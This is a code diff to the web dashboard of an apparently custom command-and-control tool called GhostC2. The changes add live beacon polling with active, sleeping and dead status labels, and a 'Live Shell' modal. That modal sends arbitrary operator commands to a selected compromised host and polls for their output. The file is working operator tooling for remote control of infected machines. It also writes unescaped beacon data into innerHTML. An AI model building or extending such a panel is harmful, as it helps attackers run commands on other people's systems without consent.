@@ -16,31 +16,45 @@
             font-family: monospace;
         }
         .form-section { margin-top: 40px; }
+        .status { font-weight: bold; }
+        tr:hover { background: #222; cursor: pointer; }
+        #modal {
+            display: none;
+            position: fixed;
+            top: 10%;
+            left: 10%;
+            width: 80%;
+            height: 80%;
+            background: #000;
+            border: 2px solid #0f0;
+            padding: 20px;
+            overflow-y: scroll;
+            z-index: 9999;
+        }
+        #modal h2 { color: #0f0; }
+        #modal-close { float: right; cursor: pointer; color: #f00; font-weight: bold; }
     </style>
 </head>
 <body>
     <a href="/console" style="color: #0f0; text-decoration: underline;">→ Open Live Console</a>
     <h1>👻 GhostC2 Beacon Dashboard</h1>
-    <table>
-        <tr>
-            <th>ID</th>
-            <th>IP</th>
-            <th>Hostname</th>
-            <th>Timestamp (UTC)</th>
-            <th>Payload</th>
-        </tr>
-        {% for beacon in beacons %}
-        <tr>
-            <td>{{ beacon[0] }}</td>
-            <td>{{ beacon[1] }}</td>
-            <td>{{ beacon[2] }}</td>
-            <td>{{ beacon[3] }}</td>
-            <td>{{ beacon[4] }}</td>
-        </tr>
-        {% endfor %}
+
+    <table id="beacon-table">
+        <thead>
+            <tr>
+                <th>Hostname</th>
+                <th>IP</th>
+                <th>Payload</th>
+                <th>Status</th>
+                <th>Last Seen</th>
+            </tr>
+        </thead>
+        <tbody id="beacon-body">
+            <!-- Populated by JS -->
+        </tbody>
     </table>
 
-   <div class="form-section">
+    <div class="form-section">
         <h2>Add New Task</h2>
         <form method="POST" action="/add_task">
             Hostname: <input type="text" name="hostname" required><br><br>
@@ -49,34 +63,139 @@
         </form>
     </div>
 
-    
     <div class="form-section">
-    <h2>Task History</h2>
-    <table>
-        <tr>
-            <th>ID</th>
-            <th>Hostname</th>
-            <th>Command</th>
-            <th>Status</th>
-            <th>Result</th>
-        </tr>
-        {% for task in tasks %}
-        <tr>
-            <td>{{ task[0] }}</td>
-            <td>{{ task[1] }}</td>
-            <td>{{ task[2] }}</td>
-            <td>{{ task[3] }}</td>
-            <td><pre>{{ task[4] }}</pre></td>
-        </tr>
-        {% endfor %}
-    </table>
+        <h2>Task History</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Hostname</th>
+                    <th>Command</th>
+                    <th>Status</th>
+                    <th>Result</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for task in tasks %}
+                <tr>
+                    <td>{{ task[0] }}</td>
+                    <td>{{ task[1] }}</td>
+                    <td>{{ task[2] }}</td>
+                    <td>{{ task[3] }}</td>
+                    <td><pre>{{ task[4] }}</pre></td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+
+    <div id="modal">
+        <div id="modal-close" onclick="document.getElementById('modal').style.display='none'; modalOpen = false;">[X]</div>
+        <h2 id="modal-title">Beacon Details</h2>
+        <div id="modal-content"></div>
+        <div id="modal-shell" style="margin-top: 20px;">
+            <h3>Live Shell</h3>
+            <form id="shell-form" onsubmit="sendShellCommand(); return false;">
+                <input type="text" id="shell-input" placeholder="Enter command..." style="width: 80%;">
+                <button type="submit">Send</button>
+            </form>
+            <pre id="shell-output">[+] Awaiting output...</pre>
+        </div>
     </div>
 
     <script>
-        setTimeout(function() {
-            window.location.reload();
-        }, 5000); // Refresh every 5 seconds
+    let currentBeacon = "";
+    let modalOpen = false;
+
+    async function loadBeacons() {
+        const res = await fetch("/api/beacons");
+        const beacons = await res.json();
+        const body = document.getElementById("beacon-body");
+        body.innerHTML = "";
+
+        beacons.forEach(b => {
+            const row = document.createElement("tr");
+            let status;
+            if (b.last_seen_seconds < 60) {
+                status = "🟢 Active";
+            } else if (b.last_seen_seconds < 300) {
+                status = "🟡 Sleeping";
+            } else {
+                status = "🔴 Dead";
+            }
+
+            row.setAttribute("data-hostname", b.hostname);
+            row.onclick = () => showBeaconDetails(b.hostname);
+
+            row.innerHTML = `
+                <td>${b.hostname}</td>
+                <td>${b.ip}</td>
+                <td>${b.payload}</td>
+                <td class="status">${status}</td>
+                <td>${Math.round(b.last_seen_seconds)}s ago</td>
+            `;
+            body.appendChild(row);
+        });
+    }
+
+    async function showBeaconDetails(hostname) {
+        currentBeacon = hostname;
+        modalOpen = true;
+        const res = await fetch(`/api/beacon/${hostname}`);
+        const data = await res.json();
+        document.getElementById("modal-title").textContent = `Beacon: ${hostname}`;
+
+        let html = `<p><strong>IP:</strong> ${data.ip}</p>`;
+        html += `<p><strong>Last Seen:</strong> ${data.timestamp}</p>`;
+        html += `<p><strong>Payload:</strong> ${data.payload}</p>`;
+
+        document.getElementById("modal-content").innerHTML = html;
+        document.getElementById("modal").style.display = "block";
+        loadShellOutput();
+    }
+
+    function sendShellCommand() {
+        const input = document.getElementById("shell-input").value;
+        if (!input || !currentBeacon) return;
+
+        fetch("/console_send", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ hostname: currentBeacon, command: input })
+        }).then(() => {
+            document.getElementById("shell-input").value = "";
+            document.getElementById("shell-output").textContent = "[+] Command sent. Awaiting result...";
+            pollShellOutput(0);
+        });
+    }
+
+    function pollShellOutput(attempts) {
+        fetch(`/console_output?hostname=${currentBeacon}`)
+            .then(res => res.text())
+            .then(txt => {
+                const outputBox = document.getElementById("shell-output");
+                if (txt.includes("[+] No output yet...") && attempts < 15) {
+                    setTimeout(() => pollShellOutput(attempts + 1), 2000);
+                } else {
+                    outputBox.textContent = txt;
+                }
+            });
+    }
+
+    function loadShellOutput() {
+        fetch(`/console_output?hostname=${currentBeacon}`)
+            .then(res => res.text())
+            .then(txt => {
+                document.getElementById("shell-output").textContent = txt;
+            });
+    }
+
+    setInterval(() => {
+        loadBeacons();
+        if (modalOpen && currentBeacon) showBeaconDetails(currentBeacon);
+    }, 5000);
+
+    window.onload = loadBeacons;
     </script>
-    
 </body>
 </html>
